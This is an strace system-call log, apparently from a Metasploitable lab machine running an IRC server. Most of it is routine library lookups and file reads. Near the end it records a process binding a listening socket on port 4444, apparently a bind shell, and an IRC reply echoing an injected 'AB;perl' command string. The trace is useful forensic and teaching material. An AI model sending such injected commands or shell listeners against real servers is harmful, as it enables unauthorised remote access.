10563 07:33:35.057197 stat64("/lib/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057208 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057219 stat64("/lib/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057230 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057241 stat64("/lib/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057252 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057263 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.057279 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057292 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057304 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057316 stat64("/usr/lib/tls/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057328 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057340 stat64("/usr/lib/tls/i686/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057352 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057364 stat64("/usr/lib/tls/i686", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057375 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057387 stat64("/usr/lib/tls/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057398 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057410 stat64("/usr/lib/tls/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057421 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057433 stat64("/usr/lib/tls/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057445 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057456 stat64("/usr/lib/tls", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057467 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057480 stat64("/usr/lib/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057500 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057540 stat64("/usr/lib/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057568 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057580 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.057598 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057610 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.057626 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057639 stat64("/usr/lib/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057650 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057662 stat64("/usr/lib/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057672 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057685 stat64("/usr/lib/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057700 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057711 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
10563 07:33:35.057728 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057741 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057754 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057767 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057779 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057792 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057805 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057817 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057829 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057842 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057854 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057867 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057878 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057891 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057903 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057915 stat64("/lib/i486-linux-gnu/tls", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057926 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057939 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057952 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057964 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057976 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057998 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058039 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058052 stat64("/lib/i486-linux-gnu/i686", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058081 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058113 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058124 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058137 stat64("/lib/i486-linux-gnu/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058148 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058161 stat64("/lib/i486-linux-gnu/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058172 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058184 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.058201 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058218 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058231 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058244 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058257 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058270 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058282 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058295 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058307 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058320 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058333 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058346 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058358 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058370 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058383 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058395 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058407 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058421 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058434 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058447 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058459 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058472 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058492 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058533 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058545 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058575 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058587 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058600 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058612 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058624 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.058636 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.058649 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.058668 munmap(0xb7ced000, 29913) = 0
10563 07:33:35.058688 open("/etc/ld.so.cache", O_RDONLY) = 6
10563 07:33:35.058701 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10563 07:33:35.058717 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7ced000
10563 07:33:35.058730 close(6)          = 0
10563 07:33:35.058741 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10563 07:33:35.058756 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
10563 07:33:35.058770 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10563 07:33:35.058860 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10563 07:33:35.058881 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7ce2000
10563 07:33:35.058893 mmap2(0xb7ceb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7ceb000
10563 07:33:35.058910 close(6)          = 0
10563 07:33:35.058934 munmap(0xb7ced000, 29913) = 0
10563 07:33:35.058951 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10563 07:33:35.058967 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10563 07:33:35.058990 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10563 07:33:35.059039 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cf4000
10563 07:33:35.059065 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10563 07:33:35.059271 close(6)          = 0
10563 07:33:35.059281 munmap(0xb7cf4000, 4096) = 0
10563 07:33:35.059300 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
10563 07:33:35.059314 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
10563 07:33:35.059330 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7cf4000
10563 07:33:35.059341 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10563 07:33:35.059565 close(6)          = 0
10563 07:33:35.059575 munmap(0xb7cf4000, 4096) = 0
10563 07:33:35.059606 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
10563 07:33:35.059627 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc6568) = -1 EINVAL (Invalid argument)
10563 07:33:35.059640 _llseek(6, 0, 0xbfbc65b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10563 07:33:35.059651 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc6568) = -1 EINVAL (Invalid argument)
10563 07:33:35.059662 _llseek(6, 0, 0xbfbc65b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10563 07:33:35.059672 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
10563 07:33:35.059723 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
10563 07:33:35.059758 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
10563 07:33:35.059783 listen(6, 5)      = 0
10563 07:33:35.059834 accept(6,  <unfinished ...>
10562 07:33:35.076336 exit_group(0)     = ?
10560 07:33:35.076456 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10562
10560 07:33:35.076479 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10560 07:33:35.076498 --- SIGCHLD (Child exited) @ 0 (0) ---
10560 07:33:35.076507 waitpid(-1, 0xbfba0f18, WNOHANG) = -1 ECHILD (No child processes)
10560 07:33:35.076518 sigreturn()       = ? (mask now [])
10560 07:33:35.076534 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10560 07:33:35.076616 exit_group(0)     = ?
4519  07:33:35.076688 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10560
4519  07:33:35.076700 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:33:35.076714 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:33:35.076725 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:33:35.076735 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:33:35.076753 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:33:35.076817 gettimeofday({1495625615, 76822}, NULL) = 0
4519  07:33:35.076831 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 2 (in [4 9], left {0, 960000})
4519  07:33:35.115111 clock_gettime(CLOCK_MONOTONIC, {2424, 932129172}) = 0
4519  07:33:35.115132 recv(4, "PRIVMSG  #testit BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 58
4519  07:33:35.115160 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115179 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115194 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115208 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115221 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115235 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115248 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115262 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115275 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115289 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115302 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115315 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115328 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115342 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115355 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115368 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115381 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115395 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115408 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115423 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115442 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
4519  07:33:35.115456 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 410000}, ...}) = 0
